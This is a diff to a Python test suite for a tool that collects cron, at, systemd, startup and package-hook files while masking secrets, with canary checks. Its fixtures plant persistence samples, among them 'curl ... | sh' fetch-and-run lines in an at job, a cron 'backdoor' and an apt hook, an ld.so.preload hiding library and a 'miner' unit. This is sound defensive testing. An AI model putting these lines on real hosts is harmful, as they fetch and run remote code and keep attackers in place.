@@ -1240,8 +1240,16 @@ class SudoersTests(FixtureRoot):
             Path(self.root, "usr/share/crypto-policies/FUTURE-opensshserver.txt"),
         )
         self.write("etc/ssh/sshd_config", b"Include /usr/share/crypto-policies/DEFAULT/*.txt\n")
-        records = collect(self.root, ["ssh"])
-        self.assertIn("/usr/share/crypto-policies/DEFAULT/opensshserver.txt", sources(records))
+        for owner, expected in ((os.getuid(), True), (os.getuid() + 1, False)):
+            collector = load_collector(self.root)
+            # Package files are root's; a hard link to a user's file is the
+            # user's, so it is never read.
+            collector.PACKAGE_OWNER_UID = owner
+            out = io.BytesIO()
+            collector.main(settings(["ssh"]), out=out)
+            records = [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
+            sent = "/usr/share/crypto-policies/DEFAULT/opensshserver.txt" in sources(records)
+            self.assertEqual(sent, expected, owner)
 
     def test_large_included_directory_is_read_incrementally(self):
         self.write("etc/sudoers", b"@includedir /etc/sudoers.d\n")
@@ -2047,6 +2055,217 @@ class MountTests(FixtureRoot):
 
 # --- Canary test: no planted secret may leave the server, through any module ----------
 
+AT_JOB = (
+    b"#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\n"
+    b"HOSTNAME=web01; export HOSTNAME\n"
+    b'MY_TOKEN=a\\ b\\$c"\n"line2; export MY_TOKEN\n'
+    b"PATH=/usr/bin:/bin; export PATH\n"
+    b"cd /tmp || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
+    b"curl -s http://203.0.113.9/x | sh\n"
+)
+
+
+class AtJobTests(unittest.TestCase):
+    def setUp(self):
+        self.collector = load_collector("/nonexistent")
+
+    def test_environment_is_replaced_by_its_names(self):
+        out = self.collector.at_job_without_environment(AT_JOB)
+        self.assertEqual(
+            out,
+            b"#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\n"
+            b"# [collector: 4 environment lines withheld; variables: HOSTNAME MY_TOKEN PATH]\n"
+            b"cd /tmp || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
+            b"curl -s http://203.0.113.9/x | sh\n",
+        )
+
+    def test_value_cannot_end_the_environment_early(self):
+        # at escapes spaces, so a value can't put "cd ... || {" on a line.
+        job = AT_JOB.replace(
+            b"PATH=/usr/bin:/bin",
+            b'X="\n"cd\\ /tmp\\ \\|\\|\\ \\{"\n"CanaryAtValue',
+        )
+        out = self.collector.at_job_without_environment(job)
+        self.assertNotIn(b"CanaryAtValue", out)
+        self.assertIn(b"curl -s", out)
+
+    def test_other_layouts_keep_only_their_leading_comments(self):
+        for job in (
+            b"#!/bin/sh\nSECRET=x; export SECRET\ncd /tmp || {\n",
+            b"#!/bin/sh\numask 22\nSECRET=x; export SECRET\necho never a cd line\n",
+            b"",
+        ):
+            out = self.collector.at_job_without_environment(job)
+            self.assertNotIn(b"SECRET", out)
+            self.assertTrue(out.endswith(b"the rest is withheld]\n"), out)
+
+
+class PersistenceTests(FixtureRoot):
+    def setUp(self):
+        super().setUp()
+        self.write(
+            "etc/passwd",
+            b"root:x:0:0:root:/root:/bin/bash\njch:x:1000:1000::/home/jch:/bin/bash\n",
+        )
+
+    def test_cron_system_files_user_crontabs_and_at_jobs(self):
+        self.write("etc/crontab", b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
+        self.write("etc/cron.d/backdoor", b"* * * * * root /usr/bin/curl -s http://x | sh\n")
+        self.write("etc/cron.daily/logrotate", b"#!/bin/sh\n/usr/sbin/logrotate /etc/x\n")
+        self.write("var/spool/cron/crontabs/jch", b"@reboot /home/jch/.x/run password=hunter2\n")
+        self.write("var/spool/cron/atjobs/a0000101c80375", AT_JOB)
+        self.write("var/spool/cron/atjobs/.SEQ", b"2\n")
+        self.write("var/spool/cron/atspool/a0000101c80375", b"job output CanarySpool\n")
+        self.write("var/spool/at/a0000201c80375", AT_JOB)  # the RHEL layout
+        self.write("var/spool/at/spool/a0000201c80375", b"job output CanarySpool\n")
+        records = collect(self.root, ["cron"])
+        sent = sources(records)
+        self.assertEqual(
+            sorted(sent),
+            [
+                "/etc/cron.d/backdoor",
+                "/etc/cron.daily/logrotate",
+                "/etc/crontab",
+                "/var/spool/at/a0000201c80375",
+                "/var/spool/cron/atjobs/.SEQ",
+                "/var/spool/cron/atjobs/a0000101c80375",
+                "/var/spool/cron/crontabs/jch",
+            ],
+        )
+        self.assertIn(b"password=[MASKED", sent["/var/spool/cron/crontabs/jch"][1])
+        for name in ("/var/spool/at/a0000201c80375", "/var/spool/cron/atjobs/a0000101c80375"):
+            self.assertNotIn(b"line2", sent[name][1])
+            self.assertIn(b"variables: HOSTNAME MY_TOKEN PATH", sent[name][1])
+            self.assertIn(b"curl -s http://203.0.113.9/x | sh", sent[name][1])
+        files = {f["path"] for f in records_named(records, "file")}
+        self.assertIn("/var/spool/cron/atspool/a0000101c80375", files)
+        self.assertIn("/var/spool/at/spool/a0000201c80375", files)
+        self.assertEqual(records[-1]["modules"]["cron"]["status"], "ok")
+
+    def test_systemd_units_generators_linger_and_user_units(self):
+        self.write("etc/systemd/system/evil.service", b"[Service]\nExecStart=/tmp/x\n")
+        self.write("etc/systemd/system/evil.timer", b"[Timer]\nOnCalendar=minutely\n")
+        os.makedirs(Path(self.root, "etc/systemd/system/timers.target.wants"))
+        os.symlink(
+            "/etc/systemd/system/evil.timer",
+            Path(self.root, "etc/systemd/system/timers.target.wants/evil.timer"),
+        )
+        self.write("run/systemd/transient/run-u1.service", b"[Service]\nExecStart=/bin/sh\n")
+        self.write("usr/lib/systemd/system/sshd.service", b"[Service]\nExecStart=/usr/sbin/sshd\n")
+        os.makedirs(Path(self.root, "lib"))
+        os.symlink("../usr/lib/systemd", Path(self.root, "lib/systemd"))
+        self.write("usr/lib/systemd/system-generators/gen", b"\x7fELF\x00binary generator")
+        self.write("etc/systemd/system.conf", b"[Manager]\nDefaultEnvironment=LD_PRELOAD=/x.so\n")
+        self.write("var/lib/systemd/linger/jch", b"")
+        unit = self.write(
+            "home/jch/.config/systemd/user/miner.service", b"[Service]\nExecStart=/tmp/m\n"
+        )
+        records = collect(self.root, ["systemd"])
+        sent = sources(records)
+        self.assertEqual(
+            sorted(sent),
+            [
+                "/etc/systemd/system.conf",
+                "/etc/systemd/system/evil.service",
+                "/etc/systemd/system/evil.timer",
+                "/run/systemd/transient/run-u1.service",
+                "/usr/lib/systemd/system/sshd.service",
+            ],
+        )
+        files = {f["path"]: f for f in records_named(records, "file")}
+        link = files["/etc/systemd/system/timers.target.wants/evil.timer"]
+        self.assertEqual(link["link_target"], "/etc/systemd/system/evil.timer")
+        self.assertIn("/var/lib/systemd/linger/jch", files)
+        user_unit = files["/home/jch/.config/systemd/user/miner.service"]
+        self.assertEqual(user_unit["sha256"], hashlib.sha256(unit.read_bytes()).hexdigest())
+        self.assertEqual(user_unit["accounts"], ["jch"])
+        self.assertIn("sha256", files["/usr/lib/systemd/system-generators/gen"])
+        skipped = records_named(records, "content_skipped")
+        self.assertEqual(
+            skipped, [{"path": "/usr/lib/systemd/system-generators/gen", "reason": "binary"}]
+        )
+        # /lib/systemd is /usr/lib/systemd: walked once.
+        tops = [s["top"] for s in records_named(records, "walk_summary")]
+        self.assertEqual(tops.count("/usr/lib/systemd/system"), 1)
+        self.assertNotIn("/lib/systemd/system", tops)
+
+    def test_startup_system_text_and_home_hashes(self):
+        self.write("etc/ld.so.preload", b"/usr/lib/libhide.so\n")
+        self.write("etc/rc.d/rc.local", b"#!/bin/sh\n/opt/x &\n")
+        os.symlink("rc.d/rc.local", Path(self.root, "etc/rc.local"))
+        self.write("etc/profile.d/zz.sh", b"export TOKEN=abc123\nalias ls='ls --hide=x'\n")
+        self.write("etc/update-motd.d/00-header", b"#!/bin/sh\n/tmp/.x &\n")
+        self.write("etc/environment", b'PATH="/usr/bin"\n')
+        bashrc = self.write("home/jch/.bashrc", b"export OPENAI_KEY=CanaryHomeStartup\n")
+        self.write("root/.ssh/rc", b"/tmp/.x &\n")
+        self.write("home/jch/.config/autostart/x.desktop", b"[Desktop Entry]\nExec=/tmp/x\n")
+        records = collect(self.root, ["startup"])
+        sent = sources(records)
+        self.assertEqual(
+            sorted(sent),
+            [
+                "/etc/environment",
+                "/etc/ld.so.preload",
+                "/etc/profile.d/zz.sh",
+                "/etc/rc.d/rc.local",
+                "/etc/update-motd.d/00-header",
+            ],
+        )
+        self.assertIn(b"TOKEN=[MASKED", sent["/etc/profile.d/zz.sh"][1])
+        # Named directly, through /etc/rc.local and by the /etc/rc.d walk: sent once.
+        starts = [r["name"] for r in records if r["type"] == "source_start"]
+        self.assertEqual(starts.count("/etc/rc.d/rc.local"), 1)
+        self.assertEqual(records_named(records, "config_link")[0]["resolved"], "/etc/rc.d/rc.local")
+        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
+        self.assertEqual(sorted(home), ["/home/jch/.bashrc", "/root/.ssh/rc"])
+        self.assertEqual(
+            home["/home/jch/.bashrc"]["sha256"], hashlib.sha256(bashrc.read_bytes()).hexdigest()
+        )
+        files = {f["path"] for f in records_named(records, "file")}
+        self.assertIn("/home/jch/.config/autostart/x.desktop", files)
+        raw = json.dumps(records)
+        self.assertNotIn("CanaryHomeStartup", raw)
+        self.assertNotIn("Exec=/tmp/x", raw)
+
+    def test_home_startup_file_linked_to_history_is_not_hashed(self):
+        self.write("home/jch/.bash_history", b"ls\n")
+        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "home/jch/.zshrc"))
+        records = collect(self.root, ["startup"])
+        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
+        self.assertNotIn("sha256", home["/home/jch/.zshrc"])
+        self.assertIn("hash_skipped", home["/home/jch/.zshrc"])
+
+    def test_hooks(self):
+        self.write("etc/apt/apt.conf.d/99x", b'DPkg::Post-Invoke {"curl http://x | sh";};\n')
+        self.write("etc/dnf/plugins/post-transaction-actions.d/x.action", b"*:any:/tmp/x\n")
+        self.write("usr/lib/python3.12/site-packages/dnf-plugins/evil.py", b"import os\n")
+        self.write("etc/udev/rules.d/99-x.rules", b'ACTION=="add", RUN+="/tmp/x"\n')
+        records = collect(self.root, ["hooks"])
+        self.assertEqual(
+            sorted(sources(records)),
+            [
+                "/etc/apt/apt.conf.d/99x",
+                "/etc/dnf/plugins/post-transaction-actions.d/x.action",
+                "/etc/udev/rules.d/99-x.rules",
+                "/usr/lib/python3.12/site-packages/dnf-plugins/evil.py",
+            ],
+        )
+
+    def test_large_and_refused_files_are_described_not_sent(self):
+        self.write("etc/cron.d/big", b"# x\n" * (70 * 1024))
+        self.write("etc/shadow", b"root:*:1::::::\n")
+        os.link(Path(self.root, "etc/shadow"), Path(self.root, "etc/cron.d/hard"))
+        os.symlink("/home/jch/.bash_history", Path(self.root, "etc/cron.d/hist"))
+        records = collect(self.root, ["cron"])
+        self.assertEqual(sources(records), {})
+        self.assertEqual(records_named(records, "content_skipped")[0]["path"], "/etc/cron.d/big")
+        unreadable = [r["path"] for r in records_named(records, "unreadable_file")]
+        self.assertEqual(unreadable, ["/etc/cron.d/hard"])
+        files = {f["path"]: f for f in records_named(records, "file")}
+        self.assertIn("hash_skipped", files["/etc/cron.d/hard"])
+        self.assertEqual(files["/etc/cron.d/hist"]["link_target"], "/home/jch/.bash_history")
+
+
 CANARIES = {
     "hash": "$6$CanarySalt$" + "H" * 86,
     "gecos": "CanaryGecosName",
@@ -2061,6 +2280,12 @@ CANARIES = {
     "sudo": "CanarySudoSecret",
     "opasswd": "CanaryOldHash",
     "envname": "CanaryEnvNameTokenAbcdefghijklmnop12",  # makes ghp_ + 36 characters
+    "atenv": "CanaryAtEnvironmentValue",
+    "spool": "CanaryAtJobOutput",
+    "crontab": "CanaryCrontabPassword",
+    "unit": "CanaryUnitToken",
+    "homestartup": "CanaryHomeStartupLine",
+    "userunit": "CanaryUserUnitLine",
 }
 
 
@@ -2099,7 +2324,20 @@ class CanaryTests(FixtureRoot):
             "hist": "home/jch/.bash_history",
             "domainhist": "home/CORP/alice/.bash_history",
         }
-        for directory in ("etc/pam.d", "etc/sudoers.d", "etc/ssh/sshd_config.d"):
+        persistence_dirs = (
+            "etc/cron.d",
+            "var/spool/cron/crontabs",
+            "var/spool/cron/atjobs",
+            "var/spool/at",
+            "etc/systemd/system",
+            "usr/lib/systemd/system",
+            "etc/profile.d",
+            "etc/udev/rules.d",
+            "etc/apt/apt.conf.d",
+        )
+        for directory in persistence_dirs:
+            os.makedirs(Path(self.root, directory))
+        for directory in ("etc/pam.d", "etc/sudoers.d", "etc/ssh/sshd_config.d") + persistence_dirs:
             for name, target in targets.items():
                 link = Path(self.root, directory, name + ".conf")
                 os.symlink(os.path.relpath(Path(self.root, target), link.parent), link)
@@ -2146,6 +2384,23 @@ class CanaryTests(FixtureRoot):
             self.write(f"{home}/.ssh/authorized_keys", ("\n".join(lines) + "\n").encode())
         self.write("etc/ssh/keys/bob", ("\n".join(lines) + "\n").encode())
         self.write("var/log/secure", f"Oct 26 sshd[1]: password={c['log']} x\n".encode())
+        # Persistence: an at job's environment and output, crontab and unit
+        # secrets, and start-up files and units in homes (hashes only).
+        job = AT_JOB.replace(b"PATH=/usr/bin:/bin", f"API={c['atenv']}".encode())
+        self.write("var/spool/cron/atjobs/a0000101c80375", job)
+        self.write("var/spool/at/a0000201c80375", job)
+        self.write("var/spool/cron/atspool/a0000101c80375", f"{c['spool']}\n".encode())
+        self.write("var/spool/at/spool/a0000201c80375", f"{c['spool']}\n".encode())
+        self.write("var/spool/cron/crontabs/jch", f"@daily mysql -p{c['crontab']} db\n".encode())
+        self.write(
+            "etc/systemd/system/app.service",
+            f"[Service]\nEnvironment=API_TOKEN={c['unit']}\n".encode(),
+        )
+        for home in ("root", "home/jch", "home/CORP/alice"):
+            self.write(f"{home}/.bashrc", f"{c['homestartup']}\n".encode())
+            self.write(f"{home}/.ssh/rc", f"{c['homestartup']}\n".encode())
+            self.write(f"{home}/.config/systemd/user/x.service", f"{c['userunit']}\n".encode())
+            os.symlink(f"/{home}/.bashrc", Path(self.root, "etc/profile.d", home.replace("/", "_")))
         self.write(
             "var/log/auth.log",
             f"Oct 26 sudo: -----BEGIN RSA PRIVATE KEY-----\n{c['private']}\n".encode(),
